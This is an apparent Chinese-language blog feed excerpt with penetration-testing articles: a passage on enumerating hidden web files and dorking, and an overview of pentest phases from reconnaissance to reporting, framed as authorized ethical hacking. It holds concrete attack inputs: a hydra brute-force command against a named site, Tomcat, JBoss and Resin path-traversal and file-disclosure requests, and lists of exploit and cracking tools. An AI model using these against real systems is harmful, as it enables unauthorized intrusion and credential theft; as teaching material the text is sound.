<p><strong>(4)  通过上面步骤,得到一个完整的网站目录结构,以及枚举到的所有目录名称,文件名称及文件扩展名.了解网站开发人员的命名思路,确定其命名规则,推测出更多的目录及文件名. </strong></p>
<p><strong>此步骤详细测试方法: </strong></p>
<p>1.检查整个列表中的文件命名规则,判读其命名依据,如发现几个部分内容相同的文件名,addnews.php,viewnews.php,那么我们就可以尝试是否存在editnews.php,delnews.php,通常只要查看几个文件名,就可以推测出网站开发人员的命名习惯,根据其个人风格,开发者可能采用各种命名方法,如冗长式(addnewuser.php),简洁式(adduser.php),缩写式(addusr.php),或者更加模糊的命名方式(addu.php).了解开发者使用的命名习惯有助于推测出尚未确定内容的准确名称. </p>
<p>2.有些不同内容的命名方案使用数字和日期作为标识符,通过他们可以轻易推测出隐藏的内容.静态页面经常采用这种命名方式.</p>
<blockquote>
<p> 例如PKAV.NET 的团队博客中,文章里所展示的图片的文件名没有被重新定义,采用了日期加数字递增的命名方案,如2012年12月12号发布的文章中的图片分别为1.jpg,2.jpg,3.jpg.那么这些图片的路径就是/2012-12-12/1.jpg, /2012-12-12/2.jpg, /2012-12-12/3.jpg  , 此时我们在博客上发布了一篇内容加密的文章,只有团队成员才知道密码,但是黑客们根据博客以往发布文章的命名规则推测出了这些图片的准确地址,从而通过图片内容泄漏了文章的大致概念. </p>
</blockquote>
<p>3.检查所有客户端代码,如HTML及JS代码,寻找任何隐藏了服务器端的线索,以及隐藏的表单元素等.认证检查注释内容,往往能带给我们惊喜,如部分通用程序会在网站首页放置一个通向网站管理后台的链接,但网站管理人员不希望这个链接被正常访问者所得知,于是将内容注释,我们可以通过查看HTML代码得知此具体地址,还有大多数的管理后台中所调用的JS 中常常会存储着后台所有功能模块的链接地址,但在判断了当前用户权限后将其隐藏起来,我们也可以通过直接查看JS代码的方式得知具体的内容,还有一些开发者会在注释内容中记录一些敏感信息,我多次从注释信息中得到数据库的名称,甚至可以得到数据库的具体连接信息,SQL 查询语句等. </p>
<p>4.把我们通过推测枚举出来的内容放在其他地方进行尝试。</p>
<blockquote>
<p> 如文件a.php 在/111/这个目录下存在,那么我们可以尝试在/222/这个目录下尝试是否存在相同文件,把所有枚举出来的文件名使用一些常规后缀来尝试访问,如index.php 这个文件已知存在,我们可以使用txt,bak,src,inc,tmp 等后缀进行尝试,如尝试index.txt,index.bak 或者添加在原有后缀基础上,index.php.bak 等.这样可以帮助我们获取这些文件的未编译版本,开发版本或者备份文件,还可以通过网站使用的语言来推测,如java 使用的.cs 后缀等. </p>
</blockquote>
<p>5.搜索开发者使用的开发工具或者文本编辑器创建的临时文件。如SVN的.svn/entries,又或者Ultraedit这类文本编辑器的自动备份功能创建的.bak文件,被大量使用的.tmp后缀,以及index.php~1 这样的遗留文件,这些都是可能会发现重要线索的细节,测试中一定不要遗漏这些步骤. </p>
<p>6.将上述的步骤自动化,提取所有存在的文件名以及目录,后缀的词干信息,在所有目录下进行自动化批量探测. </p>
<p>7.如果通过以上步骤已经确定一种统一的命名方案,那么就可以使用此命名规则在整个站点下进行测试. </p>
<p>8.不断重复以上步骤,获取更多的关键信息,根据时间及个人想象力尽情发挥! </p>
<p><strong>(5)  利用公共信息,如搜索引擎,站点快照信息,以及其网站所使用的程序开发商公布的一些使用文档等信息近一步获取目标站点更多信息. </strong></p>
<p>1.使用几种不同的搜索引擎和网站快照来获取目标站点的索引和历史内容记录.<br>2.使用搞基搜索技巧如: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">site:www.hao123.com  (返回此目标站点被搜索引擎抓取收录的所有内容) </div><div class="line">site:www.hao123.com  关键词  (返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面.此处我们可以将关键词设定为,网站后台,管理后台,密码修改,密码找回等.) </div><div class="line">site:www.hao123.com inurl:admin.php  (返回目标站点的地址中包含admin.php的所有页面,可以使用admin.php,manage.php或者其他关键词来寻找关键功能页面) </div><div class="line">link:www.hao123.com  (返回所有包含目标站点链接的页面,其中包括其开发人员的个人博客,开发日志,或者开放这个站点的第三方公司,合作伙伴等) </div><div class="line">related:www.hao123.com  (返回所有与目标站点”相似”的页面,可能会包含一些通用程序的信息等.)</div></pre></td></tr></table></figure>
<p>3.在搜索时不要只使用网页的搜索功能,可以尝试如图片,新闻等功能来定位具体信息.<br>4.从搜索引擎的快照中寻找一些关键信息,如程序报错信息可以会泄漏网站具体路径,或者一些快照中会保存一些测试用的测试信息,比如说某个网站在开发了后台功能模块的时候,还没给所有页面增加权限鉴别,此时被搜索引擎抓取了快照,即使后来网站增加了权限鉴别,但搜索引擎的快照中仍会保留这些信息.<br>5通过搜索引擎获取目标站点的子域名,得到更多的功能,如有些网站经常使用admin 这个子域名作为其管理后台,如admin.hao123.com等. </p>
<p><strong>(6)  收集网站开发者信息,如网站的开发人员,管理维护人员等在互联网上的一些信息. </strong></p>
<p>1.列出网站中得到的所有开发及维护人员的姓名和邮件地址及其他联系方式,其中包含从网站联系功能中获取到的,从HTML或JS中的注释信息中得到的,已经内容页面上获取到的。</p>
<p>2.使用上面介绍的一些高级搜索技巧,查找这些人在互联网上发布的与目标站点有关的一切信息,分析并发现有用的信息,如我曾经在用这个方法获取某国内大型网站的开发人员的信息时,竟发现他把他开发过的所有功能页面的源代码都放在一个公开的网站中,可以随意下载,包含了这个网站的数据库链接信息等关键内容,从而导致我轻松获取到这个大型网站的权限。</p>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透测试综述]]></title>
      <url>/2017/11/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%BC%E8%BF%B0/</url>
      <content type="html"><![CDATA[<p>零、前言</p>
<p>渗透测试在未得到被测试方授权之前依据某些地区法律规定是违法行为。 这里我们提供的所有渗透测试方法均为（假设为）合法的评估服务，也就是通常所说的道德黑客行为（Ethical hacking），因此我们这里的所有读者应当都是Ethical Hackers，如果您还不是，那么我希望您到过这里后会成为他们中的一员 ；）<br>这里，我还想对大家说一些话：渗透测试重在实践，您需要一颗永不言败的心和一个有着活跃思维的大脑。不是说您将这一份文档COPY到您网站上或者保存到本地电脑您就会了，即使您将它打印出来沾点辣椒酱吃了也不行，您一定要根据文档一步一步练习才行。而且测试重在用脑，千万别拿上一两个本文中提到的工具一阵乱搞，我敢保证：互联网的安全不为因为这样而更安全。祝您好运。。。</p>
<p>一、简介</p>
<ul>
<li>什么叫渗透测试？<br>渗透测试最简单直接的解释就是：完全站在攻击者角度对目标系统进行的安全性测试过程。</li>
<li>进行渗透测试的目的？<br>了解当前系统的安全性、了解攻击者可能利用的途径。它能够让管理人员非常直观的了解当前系统所面临的问题。为什么说叫直观呢？就像Mitnick书里面提到的那样，安全管理（在这里我们改一下，改成安全评估工作）需要做到面面俱到才算成功，而一位黑客（渗透测试）只要能通过一点进入系统进行破坏，他就算是很成功的了。</li>
<li>渗透测试是否等同于风险评估？<br>不是，你可以暂时理解成渗透测试属于风险评估的一部分。事实上，风险评估远比渗透测试复杂的多，它除渗透测试外还要加上资产识别，风险分析，除此之外，也还包括了人工审查以及后期的优化部分（可选）。</li>
<li>已经进行了安全审查，还需要渗透测试吗？<br>如果我对您说：嘿，中国的现有太空理论技术通过计算机演算已经能够证明中国完全有能力实现宇航员太空漫步了，没必要再发射神8了。您能接受吗？</li>
<li>渗透测试是否就是黑盒测试？<br>否，很多技术人员对这个问题都存在这个错误的理解。渗透测试不只是要模拟外部黑客的入侵，同时，防止内部人员的有意识（无意识）攻击也是很有必要的。这时，安全测试人员可以被告之包括代码片段来内的有关于系统的一些信息。这时，它就满足灰盒甚至白盒测试。</li>
<li>渗透测试涉及哪些内容?<br>技术层面主要包括网络设备，主机，数据库，应用系统。另外可以考虑加入社会工程学（<a href="http://www.china-pub.com/computers/common/info.asp?id=33722" target="_blank" rel="external">入侵的艺术</a>/<a href="http://www.amazon.com/Art-Intrusion-Exploits-Intruders-Deceivers/dp/0764569597/sr=11-1/qid=1169101240/ref=sr_11_1/103-4901794-2076652" target="_blank" rel="external">THE ART OF INTRUSION</a>）。</li>
<li>渗透测试有哪些不足之处？<br>主要是投入高，风险高。而且必须是专业的Ethical Hackers才能相信输出的最终结果。</li>
<li>你说的那么好，为什么渗透测试工作在中国开展的不是很火热呢？<br>我只能说：会的，一定会的。渗透测试的关键在于没法证明你的测试结果就是完善的。用户不知道花了钱证明了系统有问题以后，自己的安全等级到了一个什么程序。但是很显然，用户是相信一个专业且经验丰富的安全团队的，这个在中国问题比较严重。在我接触了一些大型的安全公司进行的一些渗透测试过程来看，测试人员的水平是对不住开的那些价格的，而且从测试过程到结果报表上来看也是不负责的。我估计在三年以后，这种情况会有所改观，到时一方面安全人员的技术力量有很大程度的改观，另一方面各企业对渗透测试会有一个比较深刻的理解，也会将其做为一种IT审计的方式加入到开发流程中去。渗透测试的专业化、商业化会越来越成熟。</li>
</ul>
<p>二、制定实施方案</p>
<p>实施方案应当由测试方与客户之间进行沟通协商。一开始测试方提供一份简单的问卷调查了解客户对测试的基本接收情况。内容包括但不限于如下：</p>
<ul>
<li>目标系统介绍、重点保护对象及特性。</li>
<li>是否允许数据破坏？</li>
<li>是否允许阻断业务正常运行？</li>
<li>测试之前是否应当知会相关部门接口人？</li>
<li>接入方式？外网和内网？</li>
<li>测试是发现问题就算成功，还是尽可能的发现多的问题？</li>
<li>渗透过程是否需要考虑社会工程？</li>
<li>。。。</li>
</ul>
<p>在得到客户反馈后，由测试方书写实施方案初稿并提交给客户，由客户进行审核。在审核完成后，客户应当对测试方进行书面委托授权。这里，两部分文档分别应当包含如下内容：</p>
<ul>
<li>实施方案部分：<br>...</li>
<li>书面委托授权部分：<br>...</li>
</ul>
<p>三、具体操作过程</p>
<p><strong>1、信息收集过程</strong></p>
<ul>
<li><p>网络信息收集:</p>
<p>​</p>
<p>在这一部还不会直接对被测目标进行扫描，应当先从网络上搜索一些相关信息，包括Google Hacking， Whois查询， DNS等信息（如果考虑进行社会工程学的话，这里还可以相应从邮件列表/新闻组中获取目标系统中一些边缘信息如内部员工帐号组成，身份识别方式，邮件联系地址等）。</p>
<p>​</p>
<p>涉及的工具包括：<a href="http://www.google.com/" target="_blank" rel="external">Google</a>,<a href="http://www.nosec.org/web/index.php?q=demon" target="_blank" rel="external">Demon</a>,<a href="http://www.webhosting.info/" target="_blank" rel="external">webhosting.info</a>,<a href="http://worm.ccert.edu.cn/GoogleHacking/Apollo/" target="_blank" rel="external">Apollo</a>,<a href="http://snakeoillabs.com/" target="_blank" rel="external">Athena</a>,<a href="http://snakeoillabs.com/downloads/GHDB.xml" target="_blank" rel="external">GHDB.XML</a>,<a href="http://uptime.netcraft.com/up/graph" target="_blank" rel="external">netcraft</a>,<a href="http://www.seologs.com/ip-domains.html" target="_blank" rel="external">seologs</a>　除此之外，我想特别提醒一下使用Googlebot/2.1绕过一些文件的获取限制。</p>
<p>Google hacking 中常用的一些语法描述<br>1.搜索指定站点关键字site。你可以搜索具体的站点如site:<a href="http://www.nosec.org。使用site:nosec.org可以搜索该域名下的所有子域名的页面。甚至可以使用site:org.cn来搜索中国政府部门的网站。" target="_blank" rel="external">www.nosec.org。使用site:nosec.org可以搜索该域名下的所有子域名的页面。甚至可以使用site:org.cn来搜索中国政府部门的网站。</a><br>2.搜索在URL网址中的关键字inurl。比如你想搜索带参数的站点，你可以尝试用inurl:asp?id=<br>3.搜索在网页标题中的关键字intitle。如果你想搜索一些登陆后台，你可以尝试使用intitle:&quot;admin login&quot;</p>
</li>
<li><p>目标系统信息收集:<br>通过上面一步，我们应当可以简单的描绘出目标系统的网络结构，如公司网络所在区域，子公司IP地址分布，VPN接入地址等。这里特别要注意一些比较偏门的HOST名称地址，如一些backup开头或者temp开关的域名很可能就是一台备份服务器，其安全性很可能做的不够。<br>从获取的地址列表中进行系统判断，了解其组织架构及操作系统使用情况。最常用的方法的是目标所有IP网段扫描。</p>
</li>
<li><p>端口/服务信息收集:</p>
<p>​</p>
<p>这一部分已经可以开始直接的扫描操作，涉及的工具包括：</p>
<p>nmap</p>
<p>,</p>
<p>thc-amap</p>
<p>​</p>
<p>1.我最常使用的参数<br>nmap -sS -p1-10000 -n -P0 -oX filename.xml --open -T5 <ip address=""></ip></p>
</li>
<li><p>应用信息收集：<a href="http://net-square.com/httprint/" target="_blank" rel="external">httprint</a>，SIPSCAN，smap</p>
</li>
<li><p>这里有必要将SNMP拿出来单独说一下，因为目前许多运营商、大型企业内部网络的维护台通过SNMP进行数据传输，大部分情况是使用了默认口令的，撑死改了private口令。这样，攻击者可以通过它收集到很多有效信息。<a href="http://www.japplis.com/snmp-gui/index.html" target="_blank" rel="external">snmp-gui</a>，<a href="http://www.hilisoft.com/" target="_blank" rel="external">HiliSoft MIB Browser</a>，<a href="http://www.mibsearch.com/" target="_blank" rel="external">mibsearch</a>，<a href="http://sourceforge.net/project/showfiles.php?group_id=12694" target="_blank" rel="external">net-snmp</a>都是一些很好的资源。</p>
</li>
</ul>
<p><strong>2、漏洞扫描</strong></p>
<p>这一步主要针对具体系统目标进行。如通过第一步的信息收集，已经得到了目标系统的IP地址分布及对应的域名，并且我们已经通过一些分析过滤出少许的几个攻击目标，这时，我们就可以针对它们进行有针对性的漏洞扫描。这里有几个方面可以进行：</p>
<p>针对系统层面的工具有：ISS, <a href="http://www.nessus.org/" target="_blank" rel="external">Nessus</a>, SSS, Retina, 天镜, 极光</p>
<p>针对WEB应用层面的工具有：<a href="http://www.watchfire.com/products/appscan/default.aspx" target="_blank" rel="external">AppScan</a>, <a href="http://www.acunetix.com/vulnerability-scanner/" target="_blank" rel="external">Acunetix Web Vulnerability Scanner</a>, <a href="http://www.nosec.org/web/www.spidynamics.com/products/webinspect/" target="_blank" rel="external">WebInspect</a>, <a href="http://www.nstalker.com/" target="_blank" rel="external">Nstalker</a></p>
<p>针对数据库的工具有：<a href="http://www.safety-lab.com/securityscanner/database_vulnerability_scanner" target="_blank" rel="external">ShadowDatabaseScanner</a>, <a href="http://www.ngssoftware.com/" target="_blank" rel="external">NGSSQuirreL</a></p>
<p>针对VOIP方面的工具有：<a href="http://www.ee.oulu.fi/research/ouspg/protos/testing/c07/sip/index.html" target="_blank" rel="external">PROTOS c07 sip</a>(在测试中直接用这个工具轰等于找死)以及<a href="http://www.ee.oulu.fi/research/ouspg/protos/testing/c07/h2250v4/index.html" target="_blank" rel="external">c07 h225</a>, <a href="http://www.vopsecurity.org/html/tools.html" target="_blank" rel="external">Sivus</a>, <a href="http://sipsak.org/" target="_blank" rel="external">sipsak</a>等。</p>
<p>事实上，每个渗透测试团队或多或少都会有自己的测试工具包，在漏洞扫描这一块针对具体应用的工具也比较个性化。</p>
<p><strong>3、漏洞利用</strong></p>
<p>有时候，通过服务/应用扫描后，我们可以跳过漏洞扫描部分，直接到漏洞利用。因为很多情况下我们根据目标服务/应用的版本就可以到一些安全网站上获取针对该目标系统的漏洞利用代码，如<a href="http://www.milw0rm.com/" target="_blank" rel="external">milw0rm</a>, <a href="http://www.securityfocus.net/" target="_blank" rel="external">securityfocus</a>,<a href="http://www.nosec.org/web/packetstormsecurity.nl" target="_blank" rel="external">packetstormsecurity</a>等网站，上面都对应有搜索模块。实在没有，我们也可以尝试在GOOGLE上搜索“应用名称 exploit”、“应用名称 vulnerability”等关键字。</p>
<p>当然，大部分情况下你都可以不这么麻烦，网络中有一些工具可供我们使用，最著名的当属<a href="http://www.metasploit.org/" target="_blank" rel="external">metasploit</a>了，它是一个开源免费的漏洞利用攻击平台。其他的多说无益，您就看它从榜上无名到冲进<a href="http://sectools.org/" target="_blank" rel="external">前五（top 100)</a>这一点来说，也能大概了解到它的威力了。除此之外，如果您（您们公司）有足够的moeny用于购买商用软件的话，<a href="http://www.coresecurity.com/products/coreimpact/" target="_blank" rel="external">CORE IMPACT</a>是相当值得考虑的，虽然说价格很高，但是它却是被业界公认在渗透测试方面的泰山北斗，基本上测试全自动。如果您觉得还是接受不了，那么您可以去购买<a href="http://www.immunitysec.com/products-canvas.shtml" target="_blank" rel="external">CANVAS</a>，据说有不少0DAY，不过它跟<a href="http://www.metasploit.org/" target="_blank" rel="external">metasploit</a>一样，是需要手动进行测试的。最后还有一个需要提及一下的<a href="http://www.securityforest.com/wiki/index.php/Exploitation_Framework" target="_blank" rel="external">Exploitation_Framework</a>，它相当于一个漏洞利用代码管理工具，方便进行不同语言，不同平台的利用代码收集，把它也放在这里是因为它本身也维护了一个exploit库，大家参考着也能使用。</p>
<p>上面提到的是针对系统进行的，在针对WEB方面，注入工具有NBSI, <a href="http://www.owasp.org/index.php/Category:OWASP_SQLiX_Project" target="_blank" rel="external">OWASP SQLiX</a>, <a href="http://www.sqlpowerinjector.com/download.htm" target="_blank" rel="external">SQL Power Injector</a>, <a href="http://www.ictsc.it/site/IT/projects/sqlDumper/sqlDumper.php" target="_blank" rel="external">sqlDumper</a>, <a href="http://sqlninja.sourceforge.net/" target="_blank" rel="external">sqlninja</a>, <a href="http://sqlmap.sourceforge.net/" target="_blank" rel="external">sqlmap</a>, <a href="http://www.reversing.org/node/view/11" target="_blank" rel="external">Sqlbftools</a>, <a href="http://www.priamos-project.com/" target="_blank" rel="external">priamos</a>, <a href="http://www.infobyte.com.ar/development.html" target="_blank" rel="external">ISR-sqlget</a>***等等。</p>
<p>在针对数据库方面的工具有：</p>
<p>数据库 工具列表</p>
<p> Oracle（1521端口）: 目前主要存在以下方面的安全问题：</p>
<p>1、TNS监听程序攻击（sid信息泄露,停止服务等）</p>
<p>2、默认账号(</p>
<p>default password list</p>
<p>)</p>
<p>3、SQL INJECTION（这个与传统的意思还不太一样）</p>
<p>4、缓冲区溢出，现在比较少了。 </p>
<p>thc-orakel, tnscmd ,oscanner,Getsids,TNSLSNR, lsnrcheck, OAT, Checkpwd, orabf</p>
<p> MS Sql Server（1433、1434端口）   Mysql（3306端口）   DB2（523、50000、50001、50002、50003端口） </p>
<p>db2utils Informix（1526、1528端口）  </p>
<p>在针对Web服务器方面的工具有：</p>
<p>WEB服务器 工具列表IIS IISPUTSCANNER</p>
<p> Tomcat 想起/admin和/manager管理目录了吗？另外，目录列表也是Tomcat服务器中最常见的问题。比如5.*版本中的<a href="http://127.0.0.1/;index.jsp" target="_blank" rel="external">http://127.0.0.1/;index.jsp</a></p>
<p><a href="http://www.example.com/foo/&quot;../manager/html" target="_blank" rel="external">http://www.example.com/foo/&quot;../manager/html</a> </p>
<p><a href="http://www.example.com:8080/examples/servlets/servlet/CookieExample?cookiename=HAHA&amp;cookievalue=%5C%22FOO%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2F%3B" target="_blank" rel="external">http://www.example.com:8080/examples/servlets/servlet/CookieExample?cookiename=HAHA&amp;cookievalue=%5C%22FOO%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2F%3B</a></p>
<p><a href="http://www.example.com:8080/servlets-examples/servlet/CookieExample?cookiename=BLOCKER&amp;cookievalue=%5C%22A%3D%27%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2Fservlets-examples%2Fservlet+%3B" target="_blank" rel="external">http://www.example.com:8080/servlets-examples/servlet/CookieExample?cookiename=BLOCKER&amp;cookievalue=%5C%22A%3D%27%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2Fservlets-examples%2Fservlet+%3B</a> JBOSS jboss的漏洞很少，老版本中8083端口有%符号的漏洞：</p>
<p>GET %. HTTP/1.0可以获取物理路径信息，</p>
<p>GET %server.policy HTTP/1.0可以获取安全策略配置文档。</p>
<p>你也可以直接访问GET %org/xxx/lib.class来获取编译好的java程序，再使用一些反编译工具还原源代码。 Apache   Resin <a href="http://victim/C:%5C/" target="_blank" rel="external">http://victim/C:%5C/</a></p>
<p><a href="http://victim/resin-doc/viewfile/?file=index.jsp" target="_blank" rel="external">http://victim/resin-doc/viewfile/?file=index.jsp</a></p>
<p><a href="http://victim/resin-doc/viewfile/?contextpath=/otherwebapp&amp;servletpath=&amp;file=WEB-INF/web.xml" target="_blank" rel="external">http://victim/resin-doc/viewfile/?contextpath=/otherwebapp&amp;servletpath=&amp;file=WEB-INF/web.xml</a></p>
<p><a href="http://victim/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=WEB-INF/classes/com/webapp/app/target.class" target="_blank" rel="external">http://victim/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=WEB-INF/classes/com/webapp/app/target.class</a></p>
<p><a href="http://victim/[path]/[device].[extension]" target="_blank" rel="external">http://victim/[path]/[device].[extension]</a></p>
<p><a href="http://victim/%20..&quot;web-inf" target="_blank" rel="external">http://victim/%20..&quot;web-inf</a></p>
<p><a href="http://victim/%20" target="_blank" rel="external">http://victim/%20</a></p>
<p><a href="http://victim/[path]/%20.xtp" target="_blank" rel="external">http://victim/[path]/%20.xtp</a> WebLogic  </p>
<p>Web安全测试主要围绕几块进行：</p>
<ul>
<li>Information Gathering：也就是一般的信息泄漏，包括异常情况下的路径泄漏、文件归档查找等</li>
<li>Business logic testing：业务逻辑处理攻击，很多情况下用于进行业务绕过或者欺骗等等</li>
<li>Authentication Testing：有无验证码、有无次数限制等，总之就是看能不能暴力破解或者说容不容易通过认证，比较直接的就是“默认口令”或者弱口令了</li>
<li>Session Management Testing：会话管理攻击在COOKIE携带认证信息时最有效</li>
<li>Data Validation Testing：数据验证最好理解了，就是SQL Injection和Cross Site Script等等</li>
</ul>
<p>目前网上能够找到许多能够用于进行Web测试的工具，根据不同的功能分主要有：</p>
<ol>
<li>枚举（Enumeration）： DirBuster, http-dir-enum, wget</li>
<li>基于代理测试类工具：paros, webscarab, Burp Suite</li>
</ol>
<p>针对WebService测试的部分有一些尚不是很成熟的工具，如：<a href="http://www.isecpartners.com/wsbang.html" target="_blank" rel="external">wsbang</a>，<a href="http://net-square.com/wschess/index.shtml" target="_blank" rel="external">wschess</a>，<a href="http://www.isecpartners.com/wsmap.html" target="_blank" rel="external">wsmap</a>，<a href="http://www.foundstone.com/us/resources/proddesc/wsdigger.htm" target="_blank" rel="external">wsdigger</a>，<a href="http://www.neurofuzz.com/modules/software/wsfuzzer.php" target="_blank" rel="external">wsfuzzer</a></p>
<p>这一部分值得一提的是，很多渗透测试团队都有着自己的测试工具甚至是0DAY代码，最常见的是SQL注入工具，现网开发的注入工具（如NBSI等）目前都是针对中小企业或者是个人站点/数据库进行的，针对大型目标系统使用的一些相对比较偏门的数据库系统（如INFORMIX，DB2）等，基本上还不涉及或者说还不够深入。这时各渗透测试团队就开发了满足自身使用习惯的测试工具。</p>
<p>在针对无线环境的攻击有：<a href="http://community.corest.com/~hochoa/wifizoo/index.html" target="_blank" rel="external">WifiZoo</a></p>
<p><strong>4、权限提升</strong></p>
<p>在前面的一些工作中，你或许已经得到了一些控制权限，但是对于进一步攻击来说却还是不够。例如：你可能很容易的能够获取Oracle数据库的访问权限，或者是得到了UNIX(AIX,HP-UX,SUNOS)的一个基本账号权限，但是当你想进行进一步的渗透测试的时候问题就来了。你发现你没有足够的权限打开一些密码存储文件、你没有办法安装一个SNIFFER、你甚至没有权限执行一些很基本的命令。这时候你自然而然的就会想到权限提升这个途径了。</p>
<p>目前一些企业对于补丁管理是存在很大一部分问题的，他们可能压根就没有想过对一些服务器或者应用进行补丁更新，或者是延时更新。这时候就是渗透测试人员的好机会了。经验之谈：有一般权限的Oracle账号或者AIX账号基本上等于root，因为这就是现实生活。</p>
<p><strong>5、密码破解</strong></p>
<p>有时候，目标系统任何方面的配置都是无懈可击的，但是并不是说就完全没办法进入。最简单的说，一个缺少密码完全策略的论证系统就等于你安装了一个不能关闭的防盗门。很多情况下，一些安全技术研究人员对此不屑一顾，但是无数次的安全事故结果证明，往往破坏力最大的攻击起源于最小的弱点，例如弱口令、目录列表、SQL注入绕过论证等等。所以说，对于一些专门的安全技术研究人员来说，这一块意义不大，但是对于一个ethical hacker来说，这一步骤是有必要而且绝大部分情况下是必须的。；）</p>
<p>目前比较好的网络密码暴力破解工具有：<a href="http://www.thc.org/thc-hydra/" target="_blank" rel="external">thc-hydra</a>，<a href="http://www.hoobie.net/brutus/" target="_blank" rel="external">brutus</a></p>
<p>>hydra.exe -L users.txt -P passwords.txt -o test.txt -s 2121 <a href="http://www.heimian.com/" target="_blank" rel="external">www.heimian.com</a> ftp</p>
<p>目前网络中有一种资源被利用的很广泛，那就是rainbow table技术，说白了也就是一个HASH对应表，有一些网站提供了该种服务，对外宣称存储空间大于多少G，像<a href="https://www.rainbowcrack.com/" target="_blank" rel="external">rainbowcrack</a>更是对外宣称其数据量已经大于1.3T。<br>针对此种方式对外提供在线服务的有：</p>
<p>网址 描述rainbowcrack里面对应了多种加密算法的HASH。 </p>
<p><a href="http://gdataonline.com/seekhash.php" target="_blank" rel="external">http://gdataonline.com/seekhash.php</a></p>
<p><a href="http://www.milw0rm.com/cracker/info.php" target="_blank" rel="external">http://www.milw0rm.com/cracker/info.php</a></p>
<p><a href="http://www.hashchecker.com/?_sls=search_hash" target="_blank" rel="external">http://www.hashchecker.com/?_sls=search_hash</a></p>
<p><a href="http://bokehman.com/cracker/" target="_blank" rel="external">http://bokehman.com/cracker/</a></p>
<p><a href="http://passcracking.ru/" target="_blank" rel="external">http://passcracking.ru/</a></p>
<p><a href="http://www.md5.org.cn" target="_blank" rel="external">http://www.md5.org.cn</a></p>
<p><a href="http://www.cmd5.com/" target="_blank" rel="external">http://www.cmd5.com/</a></p>
<p> 数据量全球第一，如果本站无法破解，那么你只能去拜春哥...</p>
<p>当然，有些单机破解软件还是必不可少的：<a href="http://ophcrack.sourceforge.net/" target="_blank" rel="external">Ophcrack</a>，<a href="http://www.antsight.com/zsl/rainbowcrack/" target="_blank" rel="external">rainbowcrack</a>（国人开发，赞一个），<a href="http://www.oxid.it/cain.html" target="_blank" rel="external">cain</a>，L0phtCrack（破解Windows密码），<a href="http://www.openwall.com/john" target="_blank" rel="external">John the Ripper</a>（破解UNIX/LINUX）密码，当然，还少不了一个<a href="http://www.xfocus.net/tools/200307/445.html" target="_blank" rel="external">FindPass</a>...</p>
<p>针对网络设备的一些默认帐号，你可以查询<a href="http://www.routerpasswords.com/" target="_blank" rel="external">http://www.routerpasswords.com/</a>和<a href="http://www.phenoelit-us.org/dpl/dpl.html" target="_blank" rel="external">http://www.phenoelit-us.org/dpl/dpl.html</a></p>
<p>在渗透测试过程中，一旦有机会接触一些OFFICE文档，且被加了密的话，那么，<a href="http://www.rixler.com/" target="_blank" rel="external">rixler</a>是您马上要去的地方，他们提供的OFFICE密码套件能在瞬间打开OFFICE文档（2007中我没有试过，大家有机会测试的话请给我发一份测试结果说明，谢谢）。看来微软有理由来个补丁什么的了。对于企业来说，您可以考虑使用<a href="http://www.unnoo.com/html/infoguard/" target="_blank" rel="external">铁卷</a>或者RMS了。</p>
<p><strong>６、日志清除</strong></p>
<p>It is not necessary actually.</p>
<p><strong>7、进一步渗透</strong></p>
<p>攻入了DMZ区一般情况下我们也不会获取多少用价值的信息。为了进一步巩固战果，我们需要进行进一步的内网渗透。到这一步就真的算是无所不用其及。最常用且最有效的方式就是Sniff抓包（可以加上ARP欺骗）。当然，最简单的你可以翻翻已入侵机器上的一些文件，很可能就包含了你需要的一些连接帐号。比如说你入侵了一台Web服务器，那么绝大部分情况下你可以在页面的代码或者某个配置文件中找到连接数据库的帐号。你也可以打开一些日志文件看一看。</p>
<p>除此之外，你可以直接回到第二步漏洞扫描来进行。</p>
<p>四、生成报告</p>
<p>报告中应当包含：</p>
<ol>
<li>薄弱点列表清单（按照严重等级排序）</li>
<li>薄弱点详细描述（利用方法）</li>
<li>解决方法建议</li>
<li>参与人员/测试时间/内网/外网</li>
</ol>
<p>五、测试过程中的风险及规避</p>
<p>在测试过程中无可避免的可能会发生很多可预见和不可预见的风险，测试方必须提供规避措施以免对系统造成重大的影响。以下一些可供参考：</p>
<p>\1. 不执行任何可能引起业务中断的攻击（包括资源耗竭型DoS，畸形报文攻击，数据破坏）。</p>
<p>\2. 测试验证时间放在业务量最小的时间进行。</p>
<p>\3. 测试执行前确保相关数据进行备份。</p>
<p>\4. 所有测试在执行前和维护人员进行沟通确认。</p>
<p>\5. 在测试过程中出现异常情况时立即停止测试并及时恢复系统。</p>
<p>\6. 对原始业务系统进行一个完全的镜像环境，在镜像环境上进行渗透测试。</p>
<p>参考资料:</p>
<ol>
<li><a href="http://www.unnoo.com/upimg/upload/research/20051204_UnnooPentestingServiceWhitepaper_wlj_v1.4.pdf" target="_blank" rel="external">大成天下渗透测试服务技术白皮书 v1.4</a></li>
<li><a href="http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html" target="_blank" rel="external">Penetration Testing Framework</a></li>
<li><a href="http://www.vulnerabilityassessment.co.uk/report%20template.html" target="_blank" rel="external">Report Template</a></li>
<li><a href="http://www.phenoelit.de/dpl/dpl.html" target="_blank" rel="external">http://www.phenoelit.de/dpl/dpl.html</a></li>
<li><a href="http://snakeoillabs.com/downloads/GHDB.xml" target="_blank" rel="external">http://snakeoillabs.com/downloads/GHDB.xml</a></li>
<li><a href="http://www.eccouncil.org/Course-Outline/Ethical%20Hacking%20and%20Countermeasures%20Course.htm" target="_blank" rel="external">http://www.eccouncil.org/Course-Outline/Ethical%20Hacking%20and%20Countermeasures%20Course.htm</a></li>
